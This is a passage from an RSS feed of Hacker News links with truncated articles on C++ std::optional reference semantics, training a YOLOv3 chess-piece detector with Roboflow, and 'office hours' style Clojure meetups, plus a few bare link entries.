<p>In late 2018, I was one meeting fresh of being a â€œCommittee Memberâ€. Brimming with ideas from <a href="https://thephd.github.io/rapperswil-2018-c++-committee-trip-report">my first real interaction</a> with the Committee and incensed by community problems â€“ some listed in <a href="https://www.youtube.com/watch?v=0Lwy4_sKeJM">my second ever recorded conference presentation</a> â€“ I endeavored to tackle lots of â€œwe should clean this upâ€ problems. On that list was putting references inside of <code>std::optional</code>. I only spoke to a few people at C++Now 2018 about the idea, and they nodded their heads and said â€œthis is a solved problem, we should fix itâ€. If only I had asked the right people at C++Now (literally, just one question at a lunch or break!), I would have known that this was not the case. Of course, there were additional warning signs that I was about to walk into one of the most one-sided fights of my life.</p>

<h3 id="a-deafening-silence">A Deafening Silence</h3>

<p>After attending your first Committee Meeting, dear reader, you get access to what is called â€œThe Reflectorâ€. Itâ€™s a fancy name for â€œprivate e-mail lists for Committee Members to discuss technical stuffâ€. Post-Rapperswil I joined the Reflector, verified my access, and then posted my very first message on the Reflector to some 100+ people:</p>

<blockquote>
  <p>Dear LEWG,</p>

  <p>I am doing some research on optional referencesâ€¦</p>
</blockquote>

<p>Nobody replied.</p>

<p>â€œItâ€™s okay,â€ I told myself as I swallowed down my anxiety. â€œIâ€™m just new and they just donâ€™t feel like talking about it to a newbie about this stuff; thereâ€™s a long paper trail after all.â€ I sent another follow-up e-mail six days later, stating the intent of my research and a link to a survey. Again, my e-mail was met with the sound of my own increasingly shallow and worried breathing, albeit it seemed like they had received the post because some survey results trickled in. I was perplexed and confused. Despite probing a few people here and there to verify <em>did my e-mail actually send?!</em>, I received little to no information about <em>why</em> everyone was so quietâ€¦ until a sudden DM later after the survey was published:</p>

<blockquote>
  <p>â€¦ Thanks for pursuing this. Regardless of what comes out, itâ€™s a worthwhile effort and itâ€™s probably going to be brutal.</p>
</blockquote>

<p>â€¦ Uh. <em>Excuse</em> me?</p>



<p>Ha! If only I had known that the descriptor â€˜brutalâ€™ was, in fact, taking it easy on me. In doing my survey, I journeyed to the dark and unlit places in C++ and gathered information:</p>

<p><img src="https://thephd.github.io/assets/img/2020-01-24/WusDisWusDat%20-%20Mythical%20Lies%20-%20Page%200.jpg" alt="Journeying through the C++ Dark Woods"></p>

<p>I completed the survey with just shy of 130ish participants. 110 responded to the survey directly, 20ish people and companies â€“ including the original author of Boost.Tuple, Boost <code>reference_wrapper</code>, <code>std::reference_wrapper</code>, and more â€“ replied either on a public mailing list to certain pieces / direct inquiries, or VIA private e-mail. As I reviewed the results, a steady drip of indignation slowly filled me. The reason, dear reader, was that I had been lied to. Everyone was lied to for at least 13 years by counting to the November 2018 San Diego meeting, and nearly 15 years to todayâ€™s very date.</p>



<p>If you read the technical paper, dear reader, youâ€™ll see a detailed writing about the two most prominent directions that are <em>always</em> brought up when someone talks about references in X-or-Value style wrappers like <code>expected</code>, <code>variant</code>, and <code>optional</code>. There are actually four directions in total, but we will use the two most often discussed: the â€œAssign-throughâ€ <code>optional</code> direction, and the â€œRebindâ€ <code>optional</code> direction.</p>

<p>To illustrate this, observe the following snippet:</p>

<div><div><pre><code><span>#include &lt;optional&gt;
#include &lt;iostream&gt;
</span>
<span>int</span> <span>main</span> <span>(</span><span>int</span><span>,</span> <span>char</span><span>*</span><span>[])</span> <span>{</span>
	<span>int</span> <span>x</span> <span>=</span> <span>5</span><span>;</span>
	<span>int</span> <span>y</span> <span>=</span> <span>24</span><span>;</span>
	<span>std</span><span>::</span><span>optional</span><span>&lt;</span><span>int</span><span>&amp;&gt;</span> <span>opt</span> <span>=</span> <span>x</span><span>;</span>

	<span>opt</span> <span>=</span> <span>y</span><span>;</span>
	<span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"x is "</span> <span>&lt;&lt;</span> <span>x</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
	<span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"y is "</span> <span>&lt;&lt;</span> <span>y</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>

	<span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Some people will shout from the rooftops that <code>x</code> and <code>y</code> should be <code>24</code> (the optional â€œassigns throughâ€ itself and into the referred-to object). Others say that <code>x</code> and <code>y</code> should be <code>5</code> and <code>24</code>, respectively (the optional â€œrebindsâ€ to another object, like <code>std::reference_wrapper</code>). This â€œambiguityâ€ of potential semantic choices led to a figurative holy war breaking out in not only Boost when this was first proposed, but in the Committee when it was brought up again. Back almost 15 years ago from today in Boost, Fernando Cacciola â€“ the originator of Boost.Optional â€“ had <a href="https://lists.boost.org/Archives/boost/2005/10/95487.php">this discussion and debate</a>. The full discussion â€“ if you hunt <a href="https://lists.boost.org/Archives/boost/2005/10/95079.php">down all the pieces</a> â€“ was over 100 e-mails long and featured some of todayâ€™s prominent (and todayâ€™s currently retired) C++ giants like Alisdair Meredith, Beman Dawes, Eric Niebler, and others.</p>

<p>The decision Boost made earlier was that <code>optional&lt;T&amp;&gt;</code> should rebind. This was based on a fact that Jonathan MÃ¼ller observed over a decade later in his talk Rethinking Pointers and <a href="https://foonathan.net/blog/2018/07/12/optional-reference.html">more explicitly in a blog</a> on his opinions on <code>optional&lt;T&amp;&gt;</code> and why assign-through was the <em>wrong</em> behavior:</p>

<blockquote>
  <p>Now some people think that having that behavior in the <code>operator=</code> of <code>optional&lt;T&amp;&gt;</code> itself is even a possibility they need to consider.</p>

  <p>It isnâ€™t.</p>

  <p>It absolutely isnâ€™t.</p>

  <p>Ignoring any other counter argument, those semantics would lead to confusion as <code>operator=</code> would do completely different things depending on the state of the <code>optional</code>!</p>
</blockquote>

<p>And heâ€™s right:</p>

<div><div><pre><code><span>void</span> <span>function</span> <span>(</span><span>std</span><span>::</span><span>optional</span><span>&lt;</span><span>int</span><span>&amp;&gt;</span> <span>maybe_obj</span><span>)</span> <span>{</span>
	<span>// blah blah </span>
	<span>// work ...</span>
	<span>if</span> <span>(</span><span>some_condition</span><span>)</span> <span>{</span>
		<span>int</span> <span>better_obj</span> <span>=</span> <span>...;</span>
		<span>maybe_obj</span> <span>=</span> <span>better_obj</span><span>;</span>
	<span>}</span>
	<span>// blah blah</span>
<span>}</span>
</code></pre></div></div>

<p>Imagine this code has a value for <code>maybe_obj</code> in the 95% case. You test it and it works for the cases you care about. Then, one day, <code>some_condition</code> becomes <code>true</code> <strong>and</strong> <code>maybe_obj</code> is empty; the double-whammy you never prepared you or your code for. Well, now you have a dangling reference to <code>better_obj</code> inside <code>some_condition</code>, a problem that is rarely discovered because you might use it in the time before the value becomes some wild overwritten garbage and still just â€œhappensâ€ to contain the value you like anyways and ships just fine. Itâ€™s a dangling reference to a stack variable â€“ a vulnerability waiting to happen â€“ but it compiles, runs, and ships.</p>

<p>In a rebinding world, that code is <em>always</em> wrong, and <em>always</em> gets rejected. Not by the compiler, no, but by Code Review, the <a href="https://twitter.com/Cor3ntin/status/1219897942343081986">upcoming <code>-Wlifetime</code></a>, and other tools. Static analyzers can sniff this in a heartbeat and issue a <em>hard</em> error, telling you to fix your mistake. If you have any degree of code auditing, testing, or checking, this will blow up right quick and can always be flagged down as â€œthis is wrong, stopâ€.</p>

<p>In an assign-through world, dear reader, no static analyzer can diagnose that code with 100% certainty because Maybe That Is What You Intended But Why On Godâ€™s Holy Green Goddamned Earth Would You Write Code To Do This?! But there is an even more sinister way of writing this that looks correct, smells correct, and behaves mostly correct until it does not:</p>

<div><div><pre><code><span>std</span><span>::</span><span>optional</span><span>&lt;</span><span>int</span><span>&amp;&gt;</span> <span>cache</span><span>::</span><span>retrieve</span> <span>(</span><span>std</span><span>::</span><span>uint64_t</span> <span>key</span><span>)</span> <span>{</span>
	<span>std</span><span>::</span><span>optional</span><span>&lt;</span><span>int</span><span>&amp;&gt;</span> <span>opt</span> <span>=</span> <span>this</span><span>-&gt;</span><span>get_default_resource_maybe</span><span>();</span>
	<span>// blah blah work</span>
	<span>auto</span> <span>found_a_thing</span> <span>=</span> <span>this</span><span>-&gt;</span><span>lookup_resource</span><span>(</span><span>key</span><span>);</span>
	<span>if</span> <span>(</span><span>found_a_thing</span><span>)</span> <span>{</span>
		<span>int</span><span>&amp;</span> <span>resource</span> <span>=</span> 
		  <span>this</span><span>-&gt;</span><span>get_specific_resource</span><span>(</span><span>found_a_thing</span><span>);</span>
		<span>// do stuff with resource, return</span>
		<span>opt</span> <span>=</span> <span>resource</span><span>;</span>
	<span>}</span>
	<span>return</span> <span>opt</span><span>;</span> <span>// optional says if we got something!</span>
<span>}</span>
</code></pre></div></div>

<p>In both an assign-through world and a rebinding world, this code works. Unfortunately, they work in different ways. In the Rebinding world if you do not have a cached default resource, assigning into <code>opt</code> will re-point to <code>resource</code>. It also happens if there is a resource, too, taking <code>opt</code> and rebinding it to point at the specific <code>resource</code> in the <code>found_a_thing</code> conditional.</p>

<p>The empty case is the same for assign-through (it rebinds, because there is no other option). But if you have a default resource, <em>then that resource will be <strong>overwritten</strong> by the assignment</em>. This is by far the most sinister bug: subtle overwrites of default resources for seemingly innocuous code that is, by a decent eyeballing of it, non-offensive. Not even a static analyzer can tell you this isnâ€™t what you meant to do. And yet, it is the thing that bit people who implemented assign-through optionals.</p>

<p>Myselâ€¦</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thephd.github.io/to-bind-and-loose-a-reference-optional">https://thephd.github.io/to-bind-and-loose-a-reference-optional</a></em></p>]]>
            </description>
            <link>https://thephd.github.io/to-bind-and-loose-a-reference-optional</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493274</guid>
            <pubDate>Mon, 21 Dec 2020 09:04:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Training a YOLOv3 Object Detection Model with a Custom Dataset]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25493070">thread link</a>) | @jonbaer
<br/>
December 21, 2020 | https://blog.roboflow.com/training-a-yolov3-object-detection-model-with-a-custom-dataset/ | <a href="https://web.archive.org/web/*/https://blog.roboflow.com/training-a-yolov3-object-detection-model-with-a-custom-dataset/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                <div><p><em>Following this guide, you only need to change a single line of code to train an <a href="https://models.roboflow.ai/object-detection">object detection model</a> on your own dataset.</em></p><figure><img src="https://blog.roboflow.com/content/images/2020/01/chess-detection-longer.gif" alt=""><figcaption>In our guided example, we'll train a model to recognize chess pieces. (Full <a href="https://www.youtube.com/watch?v=XLispu-Yb_0">video</a>)</figcaption></figure><p><strong>Note</strong>: <a href="https://models.roboflow.ai/object-detection/yolov5">YOLOv5</a> was released recently. You may also want to consider visiting our post on <a href="https://blog.roboflow.com/training-yolov4-on-a-custom-dataset/">how to train YOLO v5 in PyTorch tutorial</a> as it gets much better results than YOLO v3.</p><p><a href="https://models.roboflow.ai/object-detection">Object detection models</a> are extremely powerfulâ€”from finding dogs in photos to <a href="https://arxiv.org/pdf/1702.05747.pdf">improving healthcare</a>, training computers to recognize which pixels constitute items unlocks near limitless potential. However, one of the biggest blockers keeping new applications from being built is adapting state-of-the-art, open source, and free resources to solve custom problems.</p><p>In this post, weâ€™ll walk through how to prepare a custom dataset for object detection using tools that simplify image management, architecture, and training. In each section, weâ€™ll first follow what Iâ€™ve done for a specific example and and then detail what modifications youâ€™ll need to make for your custom dataset. My recommendation is that you follow along step-by-step to duplicate my process before adapting these steps to your problem.</p><p>Letâ€™s start with a clear description of our process.</p><p>Any given machine learning problem begins with a well-formed problem statement, data collection and preparation, model training and improvement, and inference. Often, our process is not strictly linear. For instance, we may find our model performs very poorly on one type of image label, and we need to revisit collecting more data on that example.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/data-process.png" alt=""><figcaption><em>The general machine learning workflow.</em></figcaption></figure><hr><h2 id="problem-statement">Problem Statement</h2><p>Chess is a fun game of wit and strategy. Improving your playing ability requires understanding where youâ€™ve previously made notable mistakes and what move(s) a superior player to you may have made in the same situation. </p><p>Thus, having a system that recognizes the state of the game and records each move would be valuable. This requires not just determining what a given chess piece is, but where that piece is on the boardâ€”a leap from image recognition to object detection. For the purposes of this post, we will constrain the problem to focus on the object detection portion: <u>can we train a model to identify which chess piece is which and to which player (black or white) the pieces belong, and a model that finds at least half of the pieces in inference.</u></p><figure><img src="https://blog.roboflow.com/content/images/2020/01/computer-vision-problems-1.png" alt=""><figcaption><em>Image Processing Problems, adapted from Stanfordâ€™s CS231N course</em></figcaption></figure><p><em>For your non-chess problem statement</em>, consider constraining the problem space to a specific piece. Moreover, consider the minimal acceptable criteria for the modelâ€™s performance. (In this example, we are constraining to just the identification of correct bounding boxes, and setting a relatively low bar for acceptable criteria. To be more rigorous, we may want to identify our modelâ€™s <a href="https://giou.stanford.edu/">IOU</a> or <a href="https://blog.roboflow.com/what-is-mean-average-precision-object-detection/">mAP</a> - but that is for <a href="https://blog.roboflow.com/what-is-mean-average-precision-object-detection/">a different post</a>.)</p><hr><h2 id="data-collection">Data Collection</h2><p>To identify chess pieces, we need to collect and annotate chess images.</p><p>I made a few assumptions in my data collection. First, all my images were captured from the same angle. I set up a tripod on the table near my chess board. For inference, this would require that my camera is at the same angle as the training data was captured â€” and not all chess players may be setting up tripods before their games. Second, I created 12 different classes: one for each of the six pieces times the two colors.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/IMG_0167.JPG" alt=""><figcaption>An (unlabeled) image example from our dataset.</figcaption></figure><p>Ultimately, I collected 292 images. I labeled all the pieces in each of these images, totaling 2894 <a href="https://blog.roboflow.com/glossary/#:~:text=annotation">annotations</a>. This <a href="https://public.roboflow.ai/object-detection/chess-full">chess dataset</a> is publicly available on <a href="https://public.roboflow.ai/">Roboflow Public Datasets</a>. For labelling, there are many high quality, free, and <a href="https://blog.roboflow.com/getting-started-with-labelimg-for-labeling-object-detection-data/">open source tools available like LabelImg</a>. I happened to use <a href="https://rectlabel.com/">RectLabel</a>, which is $3/month.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/rectLabel-example.png" alt=""><figcaption><em>An example image I labeled in RectLabel.</em></figcaption></figure><p><em>For your non-chess problem</em>, consider collecting images that are in-context of where your model will perform in production. This means ensuring you have a similar angles, lighting, quality, and objects in frame. The more situations your training set takes into account that your model may encounter in production, the better its performance will be. When labelling, it is best to draw bounding boxes that include the entirety of your objects, even if thereâ€™s a small amount of space between the object and the bounding box. Simply put, do not cut out any of the underlying object with your bounding boxes. If one piece blocks view (occludes) that of another, label as though you could see the full object (see the white-bishop and white-rook example above).</p><p>If youâ€™re seeking already annotated images, consider <a href="https://public.roboflow.ai/object-detection">object detection datasets</a> on sites like <a href="https://public.roboflow.ai/">Roboflow Public Datasets</a> which hosts a variety of free, high quality datasets.</p><hr><h2 id="data-preparation">Data Preparation</h2><p>Going straight from data collection to model training leads to suboptimal results. There may be problems with the data. Even if there arenâ€™t, <a href="https://blog.roboflow.com/tag/augmentation/">applying image augmentation</a> expands your dataset and reduces overfitting.</p><p>Preparing images for object detection includes, but is not limited to:</p><ul><li>Verifying your annotations are correct (e.g. none of the annotations are out of frame in the images)</li><li><a href="https://blog.roboflow.com/exif-auto-orientation/">Ensuring the EXIF orientation of your images is correct</a> (i.e. your images are stored on disk differently than how you view them in applications, <a href="https://news.ycombinator.com/item?id=21207411">see more</a>)</li><li><a href="https://blog.roboflow.com/you-might-be-resizing-your-images-incorrectly/">Resizing images and updating image annotations to match</a> the newly sized images</li><li>Various color corrections that may improve model performance like <a href="https://blog.roboflow.com/when-to-use-grayscale-as-a-preprocessing-step/">grayscale</a> and <a href="https://blog.roboflow.com/when-to-use-contrast-as-a-preprocessing-step/">contrast adjustments</a></li><li>Formatting annotations to match the requirements of your modelâ€™s inputs (e.g. generating <a href="https://blog.roboflow.com/how-to-create-to-a-tfrecord-file-for-computer-vision/">TFRecords for TensorFlow</a> or a flat text file for some <a href="https://models.roboflow.ai/object-detection/yolov4">implementations of YOLO</a>).<br></li></ul><p>Similar to tabular data, cleaning and augmenting image data can improve your ultimate modelâ€™s performance more than architectural changes in your model.</p><p><a href="https://roboflow.ai/">Roboflow Organize</a> is purpose-built to seamlessly solve these challenges. In fact, Roboflow Organize cuts the code you need to write <a href="https://blog.roboflow.com/eliminating-boilerplate-code-with-roboflow-to-monitor-security-footage/">roughly in half</a> while giving you access to more <a href="https://blog.roboflow.com/tag/preprocessing/">preprocessing</a> and <a href="https://blog.roboflow.com/tag/augmentation/">augmentation</a> options.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/tweet-loading-images.png" alt="Twitter Poll from Vicki Boykis (@vboykis): Learning PyTorch by doing a project. Which part am I stuck on so far? Winner: Loading image data (40.1%)"><figcaption><em>One of the biggest challenges with computer vision is simply adapting tutorials to your own dataset, not the complex modeling! (<a href="https://twitter.com/vboykis/status/1211109331489501184">Source</a>)</em></figcaption></figure><p>For our specific chess problem, our already <a href="https://public.roboflow.ai/object-detection/chess-full">preprocessed chess data is available on Roboflow.</a></p><p>Weâ€™ll be working with the Download version titled, â€œ<a href="https://public.roboflow.ai/object-detection/chess-full/1">416x416-auto-orient</a>â€.</p><p>In the case of our tutorial, weâ€™re using 416x416 images because (1) we want smaller images than the originally captured 2284â€ŠÃ—â€Š1529 dimensions for faster training and (2) for <a href="https://models.roboflow.ai/object-detection/yolo-v3-pytorch">YOLOv3</a>, multiples of 32 are most performant for its architecture.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/public-chess-dataset-416x416.png" alt="Roboflow screenshot showing annotated chess images and pre-processing steps."><figcaption>Note in this export, our preprocessing includes "Auto-Orient" and "Resize."</figcaption></figure><p>Our images also have had â€œ<a href="https://blog.roboflow.com/exif-auto-orientation/">auto-orient</a>â€ applied to them, a Roboflow preprocessing step that <a href="https://blog.roboflow.com/exif-auto-orientation/">strips the EXIF data of unintuitive orientations</a>. Auto-orient is important because images are sometimes stored on disk in different orientations than the applications we use to view them. If left uncorrected, this can cause silent failures in our models (see a discussion on HackerNews <a href="https://news.ycombinator.com/item?id=21207411">here</a>). At <a href="https://roboflow.ai/">Roboflow</a>, we often default leave this option on.</p><p>To download this dataset, select â€œ<a href="https://public.roboflow.ai/object-detection/chess-full/1">416x416-auto-orient</a>â€. Then, in the upper righthand corner, select â€œDownload.â€ Youâ€™ll be prompted to create a free account, and redirected back to the <a href="https://public.roboflow.ai/object-detection/chess-full">chess public dataset page</a>.</p><p>Now, <a href="https://roboflow.ai/">Roboflow</a> allows you to download your images and annotations in a variety of formats. You can also download them locally to your computer, or have Roboflow generate a code snippet you can use to download them directly to a Jupyter Notebook (including Colab) or Python script.</p><p>For our problem, weâ€™ll be using a <a href="https://models.roboflow.ai/object-detection/yolov3-keras">Keras YOLOv3 implementation</a> that calls for a flat text file of annotations. Weâ€™ll also be making use of Google Colab for training, so select the â€œshow download codeâ€ in the export options.</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/show-download.png" alt="Roboflow screenshot: Download Dataset dialog (YOLO v3 Keras)"><figcaption>These are the options you'll select for your Download format.</figcaption></figure><figure><img src="https://blog.roboflow.com/content/images/2020/01/code-snippt.png" alt="Roboflow Screenshot: Download Dataset, showing Jupyter notebook curl links."><figcaption>Roboflow generates a code snippet you can drop directly into a Jupyter Notebook, including Colab. Be sure you never share your Roboflow keys publicly!</figcaption></figure><p><em>For your non-chess problem</em>, you can <a href="https://app.roboflow.ai/">create a free Roboflow account</a>, upload images, preprocess, augment, and export them to any annotation format your model may require. To do so, follow our <a href="https://blog.roboflow.com/getting-started-with-roboflow/">Quick Start</a>.</p><hr><h2 id="model-training">Model Training</h2><p>The model architecture weâ€™ll use is called <a href="https://models.roboflow.ai/object-detection/yolov3-keras">YOLOv3</a>, or You Only Look Once, <a href="https://arxiv.org/abs/1804.02767">by Joseph Redmon</a>. This specific model is a one-shot learner, meaning each image only passes through the network once to make a prediction, which allows the architecture to be very performant, viewing up to 60 frames per second in predicting against video feeds. Fundamentally, <a href="https://models.roboflow.ai/object-detection/yolov3-keras">YOLO is a convolutional neural network (CNN)</a> that divides an image into subcomponents, and conducts convolutions on each of those subcomponents before pooling back to create a prediction. A recommended deeper dive on <a href="https://models.roboflow.ai/object-detection/yolov3-keras">YOLO</a> is available <a href="https://blog.roboflow.ai/a-thorough-breakdown-of-yolov4/">here</a>.</p><p>Now, even though weâ€™re training our model on a custom dataset, it is still advantageous to use another already trained modelâ€™s weights as a starting point. Think of this like we want to climb a mountain as quickly as possible, and instead of starting completely from scratch in creating our own trail, weâ€™ll start with assuming that someone elseâ€™s trail is a better faster than us randomly trying to guess twists and turns to follow.</p><p>To power our modelâ€™s computation, weâ€™ll be using Google Colab, which provides free GPU compute resources (up to 24 hours with your browser open).</p><figure><img src="https://blog.roboflow.com/content/images/2020/01/training-loss.png" alt="Google Colab Screenshot: loss over time (171/500 epochs, 15s 2s/step - loss: 75.3233, val_loss - 63.4790)"><figcaption>As validation loss drops, our model is improving.</figcaption></figure><p>In our notebook, we are predominantly doing six things:</p><ol><li>Selecting up our environment, model architecture, and pre-fit weights (someone elseâ€™s â€œtrailâ€)</li><li>Loading in our data via the Roboflow code snippet shared above</li><li>Determining our model configuration, like how many epochs to train, training batch sizes, the size of our training vs test set, and our learning rate</li><li>Initiating training (...and waiting!)</li><li>Using our trained model for inference (predictions!)</li><li>(Optional bonus) Save our newly trained weights to our Google Drive so we can â€¦</li></ol></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.roboflow.com/training-a-yolov3-object-detection-model-with-a-custom-dataset/">https://blog.roboflow.com/training-a-yolov3-object-detection-model-with-a-custom-dataset/</a></em></p>]]>
            </description>
            <link>https://blog.roboflow.com/training-a-yolov3-object-detection-model-with-a-custom-dataset/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493070</guid>
            <pubDate>Mon, 21 Dec 2020 08:19:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cog-UK update on SARS-CoV-2 Spike mutations of special interest [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25492659">thread link</a>) | @cft
<br/>
December 20, 2020 | https://www.cogconsortium.uk/wp-content/uploads/2020/12/Report-1_COG-UK_19-December-2020_SARS-CoV-2-Mutations.pdf | <a href="https://web.archive.org/web/*/https://www.cogconsortium.uk/wp-content/uploads/2020/12/Report-1_COG-UK_19-December-2020_SARS-CoV-2-Mutations.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.cogconsortium.uk/wp-content/uploads/2020/12/Report-1_COG-UK_19-December-2020_SARS-CoV-2-Mutations.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492659</guid>
            <pubDate>Mon, 21 Dec 2020 06:47:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The â€œOffice Hoursâ€ Meetup (2014)]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25492576">thread link</a>) | @luu
<br/>
December 20, 2020 | https://ideolalia.com/essays/the-office-hours-meetup.html | <a href="https://web.archive.org/web/*/https://ideolalia.com/essays/the-office-hours-meetup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

	

	<div>
		<article>
			<p>Consider the meetup speaker.  Sheâ€™s had a topic in mind for while, and so when the request went out for speakers, she volunteered.  But that was three months ago, and now the meetupâ€™s only a few weeks away, and she hasnâ€™t even begun.  She starts to outline the talk, but canâ€™t quite figure out where to start.  She can explain all the details easily, but the order in which they should be introduced, the organizing structure of the talk, remains elusive.  Giving a talk about a subject, it turns out, is not the same as having a conversation about it.</p>

<p>Consider the first-time meetup attendee.  Heâ€™s been interested in the technology for a few months, but there doesnâ€™t seem to be any guides that help him progress from the ubiquitous â€œhello worldâ€ or â€œdistributed word countâ€ examples to actual, effective production usage.  Maybe, he thinks, there will be some people at the meetup who can guide him through this awkward adolescence.  So after a long day at work, he wanders over to the meetup space, where everyoneâ€™s hanging around the open pizza boxes.  A few are eyeing the kegerator in the corner, wondering if itâ€™s off-limits.  He stands next to them and eats his pizza, listening to their conversation, wondering if he should introduce himself or just wait for the talk to begin.</p>

<p>Consider the long-time meetup attendee.  Heâ€™s been using the technology for a few years, and wants its adoption to grow, so every month he comes to the meetup, eats the pizza, makes small talk with the other regular attendees, and dutifully listens to the talk.  The talk, unfortunately, is usually either too remedial or focused on something not very relevant to his day-to-day usage.  Also, the talks tend to be scattered, introducing concepts out of order, with lots of mental throat-clearing as the speaker tries to remember what was going through their head when they made the slide.  Usually within ten minutes half the audience is looking at their laptops, with only the occasional glance up to confirm that the talk is, in fact, still going on.  He attends almost every month, and often leaves wondering why he bothers.</p>

<p>In this based-on-a-true-story scenario, everyoneâ€™s motivations are good: they want to educate and to learn, to nurture and grow the community, to meet people who share their enthusiasm.  And yet, a typical meetup is at best weakly successful in all of these dimensions.  This is for a variety of reasons:</p>

<ul>
  <li><strong>Any growing community is at least half-filled with novices.</strong>  Very few assumptions can be made about what vocabulary and concepts are universally understood.  The speaker needs to make a conscious choice to either build up from first principles, greatly delaying the time it takes to get to the actual topic at hand, or leave a significant part of the audience behind.</li>
  <li><strong>Understanding something well enough to use it doesnâ€™t mean you can explain it well.</strong>  We should all aspire to a clarity of understanding that lets us easily explain an idea to people from a variety of backgrounds, but that doesnâ€™t come for free.  Details need to be synthesized into broader concepts, without losing sight of the practical knowledge necessary to apply those concepts.  Unsurprisingly, speakers are often still ascending that learning curve.</li>
  <li><strong>The standard lecture format expects and enforces passive participation.</strong> Ostensibly the attendees are making an active choice to learn and grow by attending a meetup, but upon arriving all thatâ€™s expected of them is to eat and listen.  Each attendee likely has interests and projects of their own, but unless the talk directly addresses them, any discussion must be crammed into the margins of the meetup - either before, when people are eating and the speaker is fussing with the projector, or after, when the hosts are tidying up and giving not-so-subtle looks to everyone whoâ€™s lingering.</li>
</ul>

<p>The lecture format still has value, of course, but much less so than its widespread usage would suggest.</p>

<p>In <a href="http://en.wikipedia.org/wiki/Seeing_Like_a_State">Seeing Like a State</a>, James Scott contrasts two Ancient Greek words for knowledge, <em>techne</em> and <em>metis</em>.  <em>Techne</em> is universal and timeless: the Pythagorean theorem and the <a href="http://en.wikipedia.org/wiki/Musica_universalis">harmony of the spheres</a>.  <em>Metis</em> is local and contextual: Odysseus infiltrating Troy and escaping the Cyclops.  Our educations are anchored in <em>techne</em> - data structures, algorithms, and exams with objectively correct answers - but upon entering the real world, we find the <em>techne</em> only takes us so far.  The problems we solve are not universal, theyâ€™re bounded by the context of our particular domains.  This is fortunate, because needing to solve the general form of every problem we come across would slow our work to a standstill.  However, this means our <em>metis</em> is unavoidably tangled up in the context in which we developed it.</p>

<p>Looking back, leaving the <em>techne</em> of school for the <em>metis</em> of our jobs can feel like a fall from grace.  What was once clear is now hopelessly muddled, littered with a thousand half-remembered details.  The promise of the lecture format is a return to that higher plane, an escape from the endless minutiae that awaits below.  And yet, most of what weâ€™ve learned in our careers is within that minutiae.  There is enormous practical knowledge available at every meetup, and the lecture format uses almost none of it.</p>

<p>And so, at Factual weâ€™ve been experimenting with <a href="http://www.meetup.com/The-Bay-Area-Clojure-User-Group/events/181057342/">a Clojure meetup</a> modeled on a different academic tradition: office hours.  At a university, students who have questions about the lecture content or coursework can visit the professor, and have a one-on-one conversation.  This can be enormously freeing for both parties: the student can ask questions without fear of looking stupid or holding up the rest of the class, and the professor can focus on giving an explanation that makes sense to this particular student, rather than the entire class.</p>

<p>At the beginning of every meetup, we give everyone a name tag, and provide a whiteboard with two columns, â€œteachersâ€ and â€œstudentsâ€.  Attendees are encouraged to put their name and interests in both columns.  From there, everyone can eat their food and read the whiteboard, and go in search of someone from the opposite column who shares their interests.  Typically they form groups of two or three, sometimes with a few more people listening in.</p>

<p>Weâ€™ve only had three meetups so far, each time with around twenty attendees, but the results have been promising.  It has been especially encouraging seeing novice Clojure users bring in their first project to get a critique of their approaches, and discuss how they can better use Clojureâ€™s core abstractions.  These are precisely the sorts of conversations that create a healthy, growing community.</p>

<p>Itâ€™s unclear what the maximum practical size for this sort of meetup is.  Given the small size of each group it may scale fairly well, but at some point it becomes impossible for people to find each other.  Some sort of pre-event registration where people list their interests, and popular topics are assigned a physical location, may offset this.  However, for the vast majority of tech meetups, where the attendees number in the dozens rather than hundreds, this can be an enormously useful and engaging alternative to the lecture format.  We encourage everyone to give it a try.  And if you find yourself in San Francisco and have even a passing interest in Clojure, <a href="http://www.meetup.com/The-Bay-Area-Clojure-User-Group/events/181057342/">give us a visit</a>.</p>

<hr>

<p>This post was originally on the Factual blog, which has since been taken down post-acquisition.</p>


		</article>
	</div>

</div></div>]]>
            </description>
            <link>https://ideolalia.com/essays/the-office-hours-meetup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25492576</guid>
            <pubDate>Mon, 21 Dec 2020 06:24:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Do Interesting Work]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25492561">thread link</a>) | @eliotpeper
<br/>
December 20, 2020 | https://www.eliotpeper.com/2020/12/how-to-do-interesting-work.html | <a href="https://web.archive.org/web/*/https://www.eliotpeper.com/2020/12/how-to-do-interesting-work.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-3023080801982171274" itemprop="articleBody">
